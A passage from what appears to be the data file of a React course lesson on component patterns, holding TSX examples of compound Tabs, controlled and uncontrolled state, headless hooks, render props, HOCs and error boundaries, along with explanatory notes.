<p>A <b>headless</b> component provides behaviour, state, keyboard handling and ARIA wiring with <b>no styles and little or no markup of its own</b>. Two shapes: <b>headless hooks</b> returning state plus "prop getters" you spread onto your own elements (<code>getButtonProps()</code>, Downshift and TanStack Table style), and <b>unstyled compound components</b> (Radix Primitives, React Aria Components, Headless UI). This is how design systems ship accessible behaviour once and let teams style it with Tailwind or CSS Modules (Day 9).</p>
<h5>Render props and HOCs (mostly legacy)</h5>
<ul class="pts">
<li><b>Render prop:</b> a prop (often <code>children</code>) that is a function returning UI: <code>&lt;Mouse&gt;{pos =&gt; &lt;Dot {...pos} /&gt;}&lt;/Mouse&gt;</code>. Shares state with the caller's rendering. Most uses are now a hook (<code>usePointer()</code>). Still common where a library must give you per-item state <i>inside its own rendering</i>: React Hook Form's <code>&lt;Controller render={({ field }) =&gt; ...} /&gt;</code>, React Router's <code>&lt;Await&gt;{data =&gt; ...}&lt;/Await&gt;</code>, Headless UI's <code>{({ open }) =&gt; ...}</code>, TanStack Form's field children, virtualised list row renderers.</li>
<li><b>Higher-order component (HOC):</b> a function that takes a component and returns a new one with extra props or behaviour: <code>withAuth(Page)</code>. Problems: wrapper nesting, prop-name collisions, hard to type, static methods lost, refs not forwarded. Still seen as <code>memo(Component)</code> (technically an HOC-like wrapper), legacy Redux <code>connect</code>, MobX <code>observer</code>, <code>withErrorBoundary</code> from <code>react-error-boundary</code>, and in codebases from before 2019.</li>
</ul>
<h5>Slots via props</h5>
<p>React has no special slot syntax because it does not need one: any prop can hold <code>ReactNode</code>. <code>&lt;Card title={...} actions={...} footer={...}&gt;body&lt;/Card&gt;</code> gives named slots; <code>children</code> is the default slot. Use slots when the parent owns the <b>layout</b> and the caller provides <b>content</b>.</p>
<h5>Polymorphic <code>as</code> prop (briefly)</h5>
<p><code>&lt;Text as="label" htmlFor="email"&gt;</code> lets one component render a different element or component while keeping its styles. Simple to implement, hard to type perfectly: making TypeScript accept exactly the props of whatever <code>as</code> points at, including refs, requires complex generics and slows the type checker. Many libraries moved to an <code>asChild</code> pattern instead (Radix's <code>Slot</code>: the component merges its props onto its single child element), which side-steps most of the typing problems.</p>
<h5>Error boundaries</h5>
<ul class="pts">
<li>A component that catches errors thrown <b>while rendering</b> its subtree (and in lifecycle methods, effects, and from rejected <code>use(promise)</code> calls), then renders a fallback instead of the crashed subtree.</li>
<li><b>Still a class component.</b> There is no hook equivalent: you implement <code>static getDerivedStateFromError(error)</code> (return state that triggers the fallback) and optionally <code>componentDidCatch(error, info)</code> (log it, with <code>info.componentStack</code>). In practice most teams use the <code>react-error-boundary</code> package, which wraps that class and adds <code>FallbackComponent</code>, <code>resetKeys</code>, <code>onReset</code> and a <code>useErrorBoundary()</code> hook.</li>
<li><b>Not caught:</b> errors in <b>event handlers</b> (they run after rendering, outside React's render stack); <b>asynchronous code</b> you start yourself (<code>setTimeout</code>, a <code>fetch().then</code> in an effect, an <code>await</code> in a handler); errors during <b>server rendering</b> in the same way (the server has its own handling); and errors thrown <b>by the boundary itself</b> (they go to the next boundary up). To route these into a boundary, catch them and call <code>showBoundary(error)</code> from <code>react-error-boundary</code>, or store the error in state and throw it during render.</li>
<li>If no boundary catches a render error, React unmounts the whole root and the page goes blank. React 19 lets you observe errors centrally with <code>createRoot(el, { onCaughtError, onUncaughtError, onRecoverableError })</code>.</li>
</ul>
<h5>Container/presentational in a hooks world</h5>
<p>The old pattern split components into "containers" (fetch data, hold state) and "presentational" components (pure props → UI). Hooks made the container component mostly unnecessary: the "container" is now a custom hook (<code>useOrders()</code>), and the page component that calls it is thin. The useful core survives: keep <b>presentational components pure and prop-driven</b> so they are easy to test, reuse and put in Storybook, and keep data access in hooks. Do not split dogmatically: a small component that calls one query hook directly is fine.</p>`,
      why: `<p>Once a team has more than a handful of screens, the same UI problems repeat: tabs, accordions, menus, dialogs, comboboxes, data tables. The naive approach is one component with a prop for every variation: <code>&lt;Tabs tabs={[...]} renderTab={...} tabClassName="..." showIcons iconPosition="left" panelPadding="sm" /&gt;</code>. Every new requirement adds a prop, the component grows into a configuration language, and eventually someone forks it. Patterns like compound components, slots and headless hooks invert control: the component supplies <b>behaviour</b>, the caller supplies <b>structure and styling</b>, so new requirements rarely need a change to the shared component.</p>
<p>Controlled/uncontrolled APIs exist because the same component is used in two situations: "just work" (an FAQ accordion nobody else cares about) and "I need to drive this" (open the accordion item that matches the URL hash, sync tabs with <code>?tab=</code> search params, persist a filter to FastAPI). Supporting both avoids two components or a confusing API.</p>
<p>Render props and HOCs were the answer to "reuse stateful logic" before hooks existed; knowing them matters because they are still in libraries and in older codebases you will maintain, and because interviews ask how hooks replaced them. Error boundaries exist because, since React 16, an uncaught render error unmounts the entire tree: React deliberately prefers a blank page to a corrupted UI (imagine a payments screen showing the wrong amount). Boundaries let you choose how much of the page fails.</p>`,
      diagram: {
        html: lanes([
          ["Compound (context)", ["&lt;Tabs defaultValue=\"profile\"&gt; owns state", "provides { value, select, baseId }", "&lt;Tabs.List&gt; any markup in between", "&lt;Tabs.Tab value&gt; reads + calls select", "&lt;Tabs.Panel value&gt; reads, shows if selected"]],
          ["Headless hook", ["useDisclosure() owns state", "returns isOpen + prop getters", "you render &lt;button {...getButtonProps()}&gt;", "you render &lt;div {...getPanelProps()}&gt;", "ARIA + keyboard come from the hook"]],
          ["Error boundary", ["render throws in a child", "React unwinds to nearest boundary", "getDerivedStateFromError → fallback", "componentDidCatch → log/Sentry", "onClick / setTimeout errors bypass it"]]
        ]) + flow([["Throw in render", "Child component", "r"], ["Nearest boundary", "renders fallback", "w"], ["Rest of page", "keeps working", "g"]]),
        steps: [
          `<b>Compound components:</b> the parent holds the state (or receives it as a controlled prop) and puts <code>{ value, select }</code> in context. Children anywhere below read the context, so the consumer can arrange and wrap them freely.`,
          `<b>Headless hooks:</b> the hook owns state and returns functions that produce the right props (<code>aria-expanded</code>, <code>aria-controls</code>, <code>onClick</code>, <code>id</code>). You spread them onto your own elements, keeping full control of markup and styles.`,
          `<b>Controlled vs uncontrolled:</b> if the caller passes <code>value</code>, the component treats it as the source of truth and only calls <code>onValueChange</code>; otherwise it keeps internal state seeded from <code>defaultValue</code>.`,
          `<b>Error boundaries:</b> when rendering a child throws, React discards the in-progress subtree, finds the nearest ancestor boundary, calls <code>getDerivedStateFromError</code> to switch it to the fallback, re-renders, and calls <code>componentDidCatch</code> in the commit phase for logging. Errors in handlers and timers never pass through rendering, so they skip this mechanism entirely.`
        ]
      },
      ex: [
        {
          t: "1. Composition and slots: specialise by wrapping, customise by passing",
          lang: "tsx",
          code: `import type { ComponentPropsWithoutRef, ReactNode } from 'react';

type ButtonProps = ComponentPropsWithoutRef<'button'> & { variant?: 'primary' | 'danger' | 'ghost' };

export function Button({ variant = 'primary', className = '', ...rest }: ButtonProps) {
  return <button {...rest} className={'btn btn-' + variant + ' ' + className} />;
}

// "Inheritance" in React = a component that renders another with some props fixed.
export function DangerButton(props: Omit<ButtonProps, 'variant'>) {
  return <Button {...props} variant="danger" />;
}

// Named slots: any prop can hold ReactNode. children is the default slot.
type CardProps = {
  title: ReactNode;
  actions?: ReactNode;
  footer?: ReactNode;
  children: ReactNode;
};

export function Card({ title, actions, footer, children }: CardProps) {
  return (
    <section className="card">
      <header className="card-header">
        <h2>{title}</h2>
        {actions && <div className="card-actions">{actions}</div>}
      </header>
      <div className="card-body">{children}</div>
      {footer && <footer className="card-footer">{footer}</footer>}
    </section>
  );
}

// Usage: Card owns the layout, the caller owns the content.
export function OrderCard({ orderId, total }: { orderId: number; total: number }) {
  return (
    <Card
      title={<>Order #{orderId}</>}
      actions={<DangerButton onClick={() => console.log('cancel', orderId)}>Cancel</DangerButton>}
      footer={<small>Prices include VAT</small>}
    >
      <p>Total: {total.toFixed(2)}</p>
    </Card>
  );
}`,
          note: `<p>No <code>extends</code>, no <code>super</code>. <code>DangerButton</code> uses <code>Omit</code> so callers cannot override the fixed prop. Slots keep <code>Card</code> small: it never needs a <code>titleIcon</code> or <code>showCancel</code> prop because callers pass whatever elements they want. (Class names here are plain strings; Day 9 covers <code>clsx</code>, CSS Modules and Tailwind.)</p>`
        },
        {
          t: "2. Compound components with context: an accessible Tabs",
          lang: "tsx",
          code: `// src/components/Tabs.tsx
import { createContext, useContext, useId, useMemo, useState } from 'react';
import type { KeyboardEvent, ReactNode } from 'react';

type TabsContextValue = { value: string; select: (v: string) => void; baseId: string };
const TabsContext = createContext<TabsContextValue | null>(null);

function useTabsContext(part: string): TabsContextValue {
  const ctx = useContext(TabsContext);
  if (!ctx) throw new Error(part + ' must be rendered inside <Tabs>');
  return ctx;
}

type TabsProps = {
  value?: string;                     // controlled
  defaultValue?: string;              // uncontrolled
  onValueChange?: (value: string) => void;
  children: ReactNode;
};

export function Tabs({ value, defaultValue = '', onValueChange, children }: TabsProps) {
  const [internal, setInternal] = useState(defaultValue);
  const isControlled = value !== undefined;
  const current = value !== undefined ? value : internal;
  const baseId = useId();

  const ctx = useMemo<TabsContextValue>(() => ({
    value: current,
    baseId,
    select: (v) => {
      if (!isControlled) setInternal(v);
      onValueChange?.(v);
    },
  }), [current, baseId, isControlled, onValueChange]);

  // React 19: a context object can be rendered as the provider.
  // On React 18 write <TabsContext.Provider value={ctx}>.
  return <TabsContext value={ctx}>{children}</TabsContext>;
}

function TabList({ label, children }: { label: string; children: ReactNode }) {
  // Roving focus with arrow keys, as the WAI-ARIA tabs pattern recommends.
  function onKeyDown(e: KeyboardEvent<HTMLDivElement>) {
    if (e.key !== 'ArrowRight' && e.key !== 'ArrowLeft') return;
    const tabs = Array.from(e.currentTarget.querySelectorAll<HTMLButtonElement>('[role="tab"]'));
    const i = tabs.findIndex((t) => t === document.activeElement);
    const delta = e.key === 'ArrowRight' ? 1 : -1;
    const next = tabs[(i + delta + tabs.length) % tabs.length];
    next?.focus();
    next?.click(); // automatic activation
  }
  return <div role="tablist" aria-label={label} onKeyDown={onKeyDown}>{children}</div>;
}

function Tab({ value, children }: { value: string; children: ReactNode }) {
  const { value: selected, select, baseId } = useTabsContext('Tabs.Tab');
  const isSelected = selected === value;
  return (
    <button
      type="button"
      role="tab"
      id={baseId + '-tab-' + value}
      aria-controls={baseId + '-panel-' + value}
      aria-selected={isSelected}
      tabIndex={isSelected ? 0 : -1}
      onClick={() => select(value)}
    >
      {children}
    </button>
  );
}

function TabPanel({ value, children }: { value: string; children: ReactNode }) {
  const { value: selected, baseId } = useTabsContext('Tabs.Panel');
  const isSelected = selected === value;
  return (
    <div
      role="tabpanel"
      id={baseId + '-panel-' + value}
      aria-labelledby={baseId + '-tab-' + value}
      hidden={!isSelected}
      tabIndex={0}
    >
      {isSelected ? children : null}
    </div>
  );
}

Tabs.List = TabList;
Tabs.Tab = Tab;
Tabs.Panel = TabPanel;

// Usage: the consumer decides structure, wrappers and order.
export function AccountPage() {
  return (
    <Tabs defaultValue="profile">
      <Tabs.List label="Account sections">
        <Tabs.Tab value="profile">Profile</Tabs.Tab>
        <span className="divider" aria-hidden="true" />
        <Tabs.Tab value="billing">Billing</Tabs.Tab>
      </Tabs.List>
      <Tabs.Panel value="profile"><p>Profile form</p></Tabs.Panel>
      <Tabs.Panel value="billing"><p>Invoices from /api/invoices</p></Tabs.Panel>
    </Tabs>
  );
}`,
          out: `Initially "Profile" is selected. Click "Billing" (or press → while a tab is focused):
the Billing panel shows and the Profile panel's children unmount.
Rendering <Tabs.Tab> outside <Tabs> throws: "Tabs.Tab must be rendered inside <Tabs>".`,
          note: `<p>The <code>&lt;span className="divider"&gt;</code> between tabs would break a <code>cloneElement</code>-based implementation; with context it does not matter. Design choice in <code>TabPanel</code>: rendering <code>null</code> for inactive panels unmounts them (their state resets when you switch back); rendering children with <code>hidden</code> keeps their state but mounts everything up front. Make it explicit in your API (Radix exposes <code>forceMount</code> for this). Assigning <code>Tabs.List = TabList</code> to a function declaration is valid TypeScript (expando properties).</p>`
        },
        {
          t: "3. Controlled and uncontrolled: one useControllableState hook",
          lang: "tsx",
          code: `// src/hooks/useControllableState.ts
import { useCallback, useEffect, useRef, useState } from 'react';

type Options<T> = { value?: T; defaultValue: T; onChange?: (value: T) => void };

export function useControllableState<T>({ value, defaultValue, onChange }: Options<T>) {
  const [internal, setInternal] = useState(defaultValue);
  const isControlled = value !== undefined;

  // Dev-time warning if a caller flips between controlled and uncontrolled.
  const wasControlled = useRef(isControlled);
  useEffect(() => {
    if (import.meta.env.DEV && wasControlled.current !== isControlled) {
      console.warn('A component switched between controlled and uncontrolled. Pick one for its lifetime.');
    }
    wasControlled.current = isControlled;
  }, [isControlled]);

  const current = value !== undefined ? value : internal;

  const setValue = useCallback((next: T) => {
    if (!isControlled) setInternal(next);
    onChange?.(next);
  }, [isControlled, onChange]);

  return [current, setValue] as const;
}

// src/components/Switch.tsx
import { useState } from 'react';
import { useControllableState } from '../hooks/useControllableState';

type SwitchProps = {
  checked?: boolean;
  defaultChecked?: boolean;
  onCheckedChange?: (checked: boolean) => void;
  label: string;
};

export function Switch({ checked, defaultChecked = false, onCheckedChange, label }: SwitchProps) {
  const [on, setOn] = useControllableState({ value: checked, defaultValue: defaultChecked, onChange: onCheckedChange });
  return (
    <button type="button" role="switch" aria-checked={on} onClick={() => setOn(!on)}>
      {label}: {on ? 'On' : 'Off'}
    </button>
  );
}

// Uncontrolled: "just work"
//   <Switch label="Compact view" defaultChecked />
//
// Controlled: the parent owns the value and saves it to FastAPI
export function NotificationSettings({ initial }: { initial: boolean }) {
  const [emailOn, setEmailOn] = useState(initial);
  async function handleChange(next: boolean) {
    const previous = emailOn;
    setEmailOn(next); // optimistic
    const res = await fetch('/api/me/settings', {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email_notifications: next }),
    });
    if (!res.ok) setEmailOn(previous); // roll back
  }
  return <Switch label="Email notifications" checked={emailOn} onCheckedChange={handleChange} />;
}`,
          note: `<p>Convention: <code>value</code>/<code>defaultValue</code>/<code>onValueChange</code> (or <code>checked</code>/<code>defaultChecked</code>/<code>onCheckedChange</code>, <code>open</code>/<code>defaultOpen</code>/<code>onOpenChange</code>), as Radix and React Aria use. The <code>import.meta.env.DEV</code> check is Vite-specific. Note the controlled <code>Switch</code> shows the new value only when the parent re-renders with it, which is exactly why controlled mode makes optimistic updates and rollbacks easy. In a real app that PATCH would be a TanStack Query mutation with <code>onMutate</code>/<code>onError</code> (Day 7).</p>`
        },
        {
          t: "4. A headless hook with prop getters (and an Accordion built on it)",
          lang: "tsx",
          code: `// src/hooks/useDisclosure.ts
import { useCallback, useId, useState } from 'react';
import type { ComponentPropsWithoutRef, MouseEvent } from 'react';

export function useDisclosure(defaultOpen = false) {
  const [isOpen, setIsOpen] = useState(defaultOpen);
  const panelId = useId();
  const open = useCallback(() => setIsOpen(true), []);
  const close = useCallback(() => setIsOpen(false), []);
  const toggle = useCallback(() => setIsOpen((o) => !o), []);

  // Prop getters: merge the caller's props with the behaviour we need.
  function getButtonProps(props: ComponentPropsWithoutRef<'button'> = {}) {
    return {
      ...props,
      type: 'button' as const,
      'aria-expanded': isOpen,
      'aria-controls': panelId,
      onClick: (e: MouseEvent<HTMLButtonElement>) => {
        props.onClick?.(e);                 // caller's handler runs first
        if (!e.defaultPrevented) toggle();  // and can opt out with preventDefault()
      },
    };
  }
  function getPanelProps(props: ComponentPropsWithoutRef<'div'> = {}) {
    return { ...props, id: panelId, hidden: !isOpen };
  }

  return { isOpen, open, close, toggle, getButtonProps, getPanelProps };
}

// One accordion item: all markup and styling are the caller's.
function FaqItem({ question, answer }: { question: string; answer: string }) {
  const { isOpen, getButtonProps, getPanelProps } = useDisclosure();
  return (
    <div className="faq-item">
      <h3>
        <button {...getButtonProps({ className: 'faq-q' })}>
          {question} <span aria-hidden="true">{isOpen ? '−' : '+'}</span>
        </button>
      </h3>
      <div {...getPanelProps({ className: 'faq-a' })}>{answer}</div>
    </div>
  );
}

export function Faq({ items }: { items: { id: number; q: string; a: string }[] }) {
  return <div>{items.map((i) => <FaqItem key={i.id} question={i.q} answer={i.a} />)}</div>;
}`,
          note: `<p>This is the Downshift/TanStack style: zero markup, all behaviour. Each <code>FaqItem</code> calls <code>useDisclosure</code> so each has its own open state (logic shared, state not). For a "only one open at a time" accordion, lift the state into a compound <code>&lt;Accordion&gt;</code> parent with context, exactly like <code>Tabs</code>, and let items read <code>openId</code>. In production you would typically reach for Radix Primitives, React Aria or Headless UI rather than hand-roll focus management for menus and comboboxes; the libraries encode many edge cases (typeahead, focus restore, screen reader quirks).</p>`
        },
        {
          t: "5. Render props and HOCs, and their hook replacements",
          lang: "tsx",
          code: `import { useState } from 'react';
import type { ComponentType, PointerEvent, ReactNode } from 'react';

type Point = { x: number; y: number };

// Render prop (pre-2019 style): children is a function.
export function PointerTracker({ children }: { children: (p: Point) => ReactNode }) {
  const [p, setP] = useState<Point>({ x: 0, y: 0 });
  return (
    <div style={{ height: 200 }} onPointerMove={(e) => setP({ x: e.clientX, y: e.clientY })}>
      {children(p)}
    </div>
  );
}
// <PointerTracker>{({ x, y }) => <p>{x}, {y}</p>}</PointerTracker>

// Hook equivalent: same logic, no extra component layer, composes with other hooks.
export function usePointer() {
  const [p, setP] = useState<Point>({ x: 0, y: 0 });
  const onPointerMove = (e: PointerEvent<HTMLElement>) => setP({ x: e.clientX, y: e.clientY });
  return { ...p, bind: { onPointerMove } };
}
// const { x, y, bind } = usePointer(); <div {...bind}>{x}, {y}</div>

// HOC: function from component to component.
type WithUserProps = { user: { id: number; name: string } };

export function withUser<P extends WithUserProps>(Wrapped: ComponentType<P>) {
  function WithUser(props: Omit<P, keyof WithUserProps>) {
    const user = useCurrentUser(); // HOCs can call hooks inside the component they create
    if (!user) return <p>Please log in</p>;
    return <Wrapped {...(props as P)} user={user} />;
  }
  WithUser.displayName = 'withUser(' + (Wrapped.displayName ?? Wrapped.name) + ')';
  return WithUser;
}
// const ProfileWithUser = withUser(Profile);
// Hook equivalent: const user = useCurrentUser(); inside Profile. Fewer layers, obvious data flow.

declare function useCurrentUser(): WithUserProps['user'] | null;`,
          note: `<p>The <code>props as P</code> cast is the classic HOC typing wart: TypeScript cannot prove that <code>Omit&lt;P, 'user'&gt; &amp; { user }</code> equals <code>P</code> for a generic <code>P</code>. That friction is one reason hooks won. Where render props remain: React Hook Form <code>&lt;Controller render&gt;</code>, React Router <code>&lt;Await&gt;</code>, Headless UI state children, virtualised list rows. Where HOCs remain: <code>memo</code>, MobX <code>observer</code>, legacy Redux <code>connect</code>, <code>withErrorBoundary</code>.</p>`
        },
        {
          t: "6. Polymorphic as prop (and its TypeScript caveat)",
          lang: "tsx",
          code: `import type { ComponentPropsWithoutRef, ElementType, ReactNode } from 'react';

type TextProps<C extends ElementType> = {
  as?: C;
  tone?: 'default' | 'muted';
  children?: ReactNode;
} & Omit<ComponentPropsWithoutRef<C>, 'as' | 'tone' | 'children'>;

export function Text<C extends ElementType = 'span'>({ as, tone = 'default', children, ...rest }: TextProps<C>) {
  // Widening to ElementType is the usual escape hatch: TypeScript cannot check that
  // 'rest' matches 'C' inside the generic body, so it would otherwise reject the JSX.
  const Component: ElementType = as ?? 'span';
  return <Component className={'text text-' + tone} {...rest}>{children}</Component>;
}

// Call sites ARE checked against the chosen element:
// <Text as="label" htmlFor="email">Email</Text>    OK: htmlFor exists on <label>
// <Text as="a" href="/api/docs">API docs</Text>     OK
// <Text as="span" href="/x">x</Text>                error: href does not exist on <span>`,
          note: `<p>Caveats: refs need extra typing (in React 19 <code>ref</code> is a regular prop for function components, but typing it per <code>as</code> target is still fiddly); deeply generic polymorphic components slow down the type checker and produce long error messages; and an <code>as={Link}</code> from React Router works but merges two prop sets. Many design systems prefer <code>asChild</code> (Radix <code>Slot</code>): <code>&lt;Button asChild&gt;&lt;Link to="/orders" /&gt;&lt;/Button&gt;</code>, where the child element keeps its own types. Day 14 goes deeper into typing components.</p>`
        },
        {
          t: "7. Error boundary: the class you still write (or don't)",
          lang: "tsx",
          code: `// src/components/ErrorBoundary.tsx
import { Component } from 'react';
import type { ErrorInfo, ReactNode } from 'react';

type Props = {
  fallback: ReactNode;
  onError?: (error: unknown, info: ErrorInfo) => void;
  children: ReactNode;
};
type State = { hasError: boolean };

export class ErrorBoundary extends Component<Props, State> {
  state: State = { hasError: false };

  // Render phase: switch to the fallback. Must be pure.
  static getDerivedStateFromError(): State {
    return { hasError: true };
  }

  // Commit phase: side effects such as logging are allowed here.
  componentDidCatch(error: unknown, info: ErrorInfo) {
    this.props.onError?.(error, info);
  }

  render() {
    return this.state.hasError ? this.props.fallback : this.props.children;
  }
}

// Usage: one boundary per independent region, not one per component.
function Dashboard() {
  return (
    <main>
      <ErrorBoundary fallback={<p role="alert">Revenue chart unavailable.</p>}>
        <RevenueChart />
      </ErrorBoundary>
      <ErrorBoundary fallback={<p role="alert">Orders unavailable.</p>}>
        <RecentOrders />
      </ErrorBoundary>
    </main>
  );
}

function RevenueChart() {
  // Simulates a bad API payload: the backend sent null instead of { points: [...] }
  const data = JSON.parse('null') as { points: number[] };
  return <p>{data.points.length} points</p>; // TypeError during render → caught
}
function RecentOrders() { return <p>3 recent orders</p>; }
export default Dashboard;`,
          out: `Page shows:
  Revenue chart unavailable.
  3 recent orders
Console (dev): the TypeError is logged once with the component stack.
Without the boundary: the entire root unmounts and the page is blank.`,
          note: `<p>This boundary has no reset: once tripped it stays in fallback until it remounts. That is the main reason to use <code>react-error-boundary</code> (next example). Class field <code>state</code> and the <code>static</code> method are the only "class component" knowledge modern React needs. React 19 changed reporting: errors caught by a boundary are reported once via <code>console.error</code> (and the root's <code>onCaughtError</code>) rather than being re-thrown, so the console is less noisy than in React 18.</p>`
        },
        {
          t: "8. react-error-boundary: reset, logging, and forwarding handler/async errors",
          lang: "tsx",
          code: `// npm install react-error-boundary
import { ErrorBoundary, useErrorBoundary } from 'react-error-boundary';
import type { FallbackProps } from 'react-error-boundary';
import { useState } from 'react';

function ErrorFallback({ error, resetErrorBoundary }: FallbackProps) {
  const message = error instanceof Error ? error.message : String(error);
  return (
    <div role="alert">
      <p>Something went wrong: {message}</p>
      <button onClick={resetErrorBoundary}>Try again</button>
    </div>
  );
}

export function ProfileRoute({ userId }: { userId: number }) {
  return (
    <ErrorBoundary
      FallbackComponent={ErrorFallback}
      onError={(error, info) => reportError(error, info.componentStack)} // e.g. Sentry
      resetKeys={[userId]} // navigating to another user clears the error automatically
    >
      <ProfileEditor userId={userId} />
    </ErrorBoundary>
  );
}

function ProfileEditor({ userId }: { userId: number }) {
  const { showBoundary } = useErrorBoundary();
  const [saving, setSaving] = useState(false);

  async function handleSave() {
    setSaving(true);
    try {
      const res = await fetch('/api/users/' + userId, { method: 'PUT', body: '{}' });
      if (res.status === 422) {
        // Expected, recoverable error: handle locally, keep the form on screen.
        alert('Please fix the highlighted fields');
        return;
      }
      if (!res.ok) throw new Error('Save failed with ' + res.status);
    } catch (err) {
      // Unexpected error in an async event handler: a boundary would NOT see this
      // on its own. Forward it explicitly.
      showBoundary(err);
    } finally {
      setSaving(false);
    }
  }

  function handleCrash() {
    // Thrown in an event handler: NOT caught by any boundary. It becomes an
    // uncaught error (window 'error' event / console), and the UI stays as is.
    throw new Error('boom from onClick');
  }

  return (
    <div>
      <button onClick={handleSave} disabled={saving}>Save</button>
      <button onClick={handleCrash}>Crash (not caught)</button>
    </div>
  );
}

declare function reportError(error: unknown, componentStack?: string | null): void;`,
          note: `<p>Rule of thumb: <b>expected</b> errors (validation, 404 for an optional resource, 409 conflict) are handled where they happen with state and a message; <b>unexpected</b> ones go to a boundary so the user gets a consistent fallback and you get a report. Other ways errors reach boundaries: TanStack Query's <code>throwOnError</code> (rethrows during render; pair with <code>QueryErrorResetBoundary</code>, Day 7), a rejected promise read with <code>use()</code>, and, in React 19, an error thrown inside an action passed to <code>startTransition</code>. The exact type of <code>error</code> in <code>FallbackProps</code> has varied across <code>react-error-boundary</code> versions, so narrowing with <code>instanceof Error</code> is the safe habit.</p>`
        },
        {
          t: "9. Container/presentational in a hooks world",
          lang: "tsx",
          code: `// Presentational: pure, prop-driven, trivially testable and Storybook-friendly.
type Order = { id: number; customer: string; total: number; status: 'paid' | 'pending' };

export function OrderTable({ orders, onSelect }: { orders: Order[]; onSelect: (id: number) => void }) {
  if (orders.length === 0) return <p>No orders yet.</p>;
  return (
    <table>
      <thead><tr><th>#</th><th>Customer</th><th>Total</th><th>Status</th></tr></thead>
      <tbody>
        {orders.map((o) => (
          <tr key={o.id} onClick={() => onSelect(o.id)}>
            <td>{o.id}</td><td>{o.customer}</td><td>{o.total.toFixed(2)}</td><td>{o.status}</td>
          </tr>
        ))}
      </tbody>
    </table>
  );
}

// The old "container component" is now a custom hook...
import { useQuery } from '@tanstack/react-query';
import { useNavigate } from 'react-router';

function useOrders() {
  return useQuery({
    queryKey: ['orders'],
    queryFn: async ({ signal }): Promise<Order[]> => {
      const res = await fetch('/api/orders', { signal });
      if (!res.ok) throw new Error('Failed to load orders');
      return res.json();
    },
  });
}

// ...plus a thin route component that wires data to presentation.
export function OrdersPage() {
  const { data, isPending, isError, error } = useOrders();
  const navigate = useNavigate();
  if (isPending) return <p>Loading…</p>;
  if (isError) return <p role="alert">{error.message}</p>;
  return <OrderTable orders={data} onSelect={(id) => navigate('/orders/' + id)} />;
}`,
          note: `<p><code>OrderTable</code> knows nothing about FastAPI, TanStack Query or the router, so its tests pass plain arrays and a <code>vi.fn()</code>. <code>OrdersPage</code> is the integration point, tested with MSW (Day 14). After the <code>isPending</code> and <code>isError</code> checks, TypeScript narrows <code>data</code> to <code>Order[]</code>. Requires <code>@tanstack/react-query</code> and <code>react-router</code> (v7).</p>`
        }
      ],
      internals: `<p><b>Compound components are just context.</b> When <code>&lt;Tabs&gt;</code> renders its provider, React pushes the value onto an internal context stack while rendering that subtree; each <code>useContext(TabsContext)</code> reads the top value and registers a dependency on the fiber. When the provided value changes (by <code>Object.is</code>), React walks the subtree and schedules re-renders for the fibers that read that context, even if intermediate components bailed out with <code>memo</code>. That is why the <code>useMemo</code> around the context value matters: without it, every render of <code>&lt;Tabs&gt;</code> creates a new object and re-renders every <code>Tab</code> and <code>Panel</code> (Day 6 goes into splitting contexts for performance).</p>
<p><b>Why <code>cloneElement</code> lost.</b> <code>React.Children.map(children, c =&gt; cloneElement(c, { selected }))</code> works on the <i>elements</i> you passed, not on what they render. A fragment, a wrapper <code>&lt;div&gt;</code>, or a <code>&lt;MyTab&gt;</code> that renders <code>&lt;Tabs.Tab&gt;</code> internally all hide the target from the parent. The React docs list <code>Children</code> and <code>cloneElement</code> as legacy APIs for this reason; context reaches through any depth.</p>
<p><b>Render props and HOCs in the fiber tree.</b> A render prop is called during the provider component's render, so its output becomes children of that fiber. Each HOC adds a real component (and fiber) to the tree: <code>withA(withB(withC(Page)))</code> is four fibers, visible in DevTools as nested wrappers. Hooks add <i>no</i> fibers: they are nodes in the calling component's hook list (see the previous topic). Defining an HOC call inside a component body (<code>const Enhanced = withUser(Profile)</code> inside render) creates a new component <i>type</i> each render, so React unmounts and remounts the subtree every time, destroying its state.</p>
<p><b>How error boundaries work.</b> When a component throws during the render phase, React's work loop catches it (<code>handleThrow</code> / <code>throwException</code> in the reconciler). It walks up the <code>return</code> pointers from the failed fiber looking for a class fiber with <code>getDerivedStateFromError</code> or <code>componentDidCatch</code>. It marks that fiber with a <code>ShouldCapture</code> flag and enqueues an update whose payload calls <code>getDerivedStateFromError(error)</code>; the boundary re-renders with the new state (the fallback), and the partially rendered subtree is thrown away. In the commit phase, <code>componentDidCatch(error, { componentStack })</code> runs. Thrown promises go through the same unwinding path but look for a Suspense boundary instead (Day 12). Before giving up, React retries the failed render once synchronously, in case the error came from a concurrent-only inconsistency.</p>
<p><b>Why event handlers are not covered.</b> Event handlers run when the browser dispatches an event, through React's root listener, long after rendering finished. There is no render in progress and no fiber on the stack to unwind; an exception simply propagates to React's dispatch code, which reports it (it surfaces as an uncaught error) without touching the tree. Same for <code>setTimeout</code> callbacks and promise continuations. Errors in <code>useEffect</code>/<code>useLayoutEffect</code> bodies <i>are</i> caught, because React invokes effects inside its commit phase and attributes the error to the fiber.</p>
<p><b>No uncaught render errors allowed.</b> If no boundary exists, React unmounts the whole root. The rationale (since React 16) is that leaving a corrupted UI on screen is worse than removing it. React 19 exposes <code>onUncaughtError</code> and <code>onCaughtError</code> on <code>createRoot</code>/<code>hydrateRoot</code> so you can report both kinds centrally.</p>`,
      prod: `<p><b>Design system.</b> In a React + FastAPI product the shared UI layer (often a <code>packages/ui</code> workspace, Day 15) is where these patterns pay off. Typical shape: Radix Primitives or React Aria for behaviour (headless, accessible), styled with Tailwind or CSS Modules, re-exported as compound components (<code>Dialog</code>, <code>Tabs</code>, <code>Select</code>, <code>DropdownMenu</code>) that all follow the same <code>value</code>/<code>defaultValue</code>/<code>onValueChange</code> conventions. Feature teams then compose screens with slots and children instead of filing "please add a prop" tickets.</p>
<p><b>Controlled components connected to the URL and backend.</b> Tabs controlled by <code>?tab=billing</code> via <code>useSearchParams</code> (Day 8) survive refresh and can be linked to; filters controlled by state that becomes a TanStack Query key hitting <code>/api/orders?status=paid</code>, which FastAPI serves from Redis when warm. This only works if the components offer a controlled mode.</p>
<p><b>Error boundaries placement.</b></p>
<ul class="pts">
<li><b>Root boundary</b>: a full-page "Something went wrong, reload" with a support ID. React Router v7 also has route-level <code>ErrorBoundary</code> exports/<code>errorElement</code> that catch loader, action and render errors for that route (Day 8).</li>
<li><b>Widget boundaries</b> around independently failing regions: charts, third-party embeds, a markdown renderer fed by user content, anything that parses data from FastAPI you don't fully trust.</li>
